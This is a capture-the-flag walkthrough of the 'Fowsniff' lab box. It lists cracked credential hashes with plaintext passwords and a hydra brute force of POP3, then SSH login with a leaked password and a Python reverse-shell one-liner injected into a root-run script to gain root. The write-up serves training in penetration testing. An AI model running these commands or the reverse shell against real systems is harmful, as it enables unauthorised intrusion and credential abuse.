## Fowsniff_CTF

'export IP=10.10.195.86'

## Hack into the FowSniff organisation.
First stage is to do an initial nmap Scan of the IP address given using the nmpa command `nmap -sC -sV -oN nmap/initial $IP`
Once the results from this scan are given which shows that port 80 is open we can do soem web enumaration will runing a full port scan of the box `nmap -p- -sC -sV -oN nmap/Full $IP`

While that is running we can use gobuster to do a full website `gobuster dir -u http://$IP:80 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt > gobuster/sitescan`
We can also check out the website and see if that holds any cluss manually.
![]()
Looking at the page manually did not give us any information so we can also use google to search the web which allows us to find a twitter account connected to the corporation with the twitter handle `@Fowsniff` When reading the tweets it shows that there are two pastbins linked which are supposadly the passwords for the corporation
The first paste bin
`https://pastebin.com/NrAqVeeX`
The second paste bin
`https://pastebin.com/378rLnGi`

The first one is more important as it contains usernames and hashes and using crackstation to crack the md5 hashes you get:
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4:mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
tegel@fowsniff:1dc352435fecca338acfd4be10984009:apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb:skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd:
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11:orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e:07011972

With the details we have gathered we can then try and bruteforce the pop3 as the pastebin said that the pop3 server was open.
For this we create a user and password files so that they can be used with hydra

`hydra pop3://$IP -L users.txt -P passwords.txt`

this shows that we can login with seina and pasword scoobydoo2

using this information we can then use netcat to connect to the pop3 server to see if we can get any extra information
`nc 10.10.195.86 110`

Once logged in we find there are two emails
retriving email 1

Within this email it shows that there is a temporary SSH Password S1ck3nBluff+secureshell

Looking at the second email it seems nothing important although there is a username we have not seen before and that is baksteen.

So using this information we can try and ssh into the box 
`ssh baksteen@$IP` witht the password S1ck3nBluff+secureshell
This information allows us to login

we can then use the command `id` to find what groups baksteen belongs to and we find out that he belongs to two diffrent groups users and baksteen so using this information we want to enumarate the box.
`find / -group users -type f 2>/dev/null`
looking at the results there is one file that looks interesting /opt/cube/cube.sh

When using vi on the cube.sh file we find it is the information for the ssh login page as such we could use this to get a reverse shell on the box as this is run by root.

Before we get a revershell we need to know what the box has on it already to run the command the first thing to try is python and python3
running the command `python` tells us that we have python3 installed so we can use python3 to get us a reverse shell using the command from this [pentest monkey page](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

we can then test that this revers shell works by listening on the given port and you should see the following:

Once we confirmed the sell works we want to exit the ssh shell and restart the netcat listner before trying to login in again and once you are then logged in again you shoud get the following:


now that we have the reverse shell we can go to roots home folder and find flag.txt.
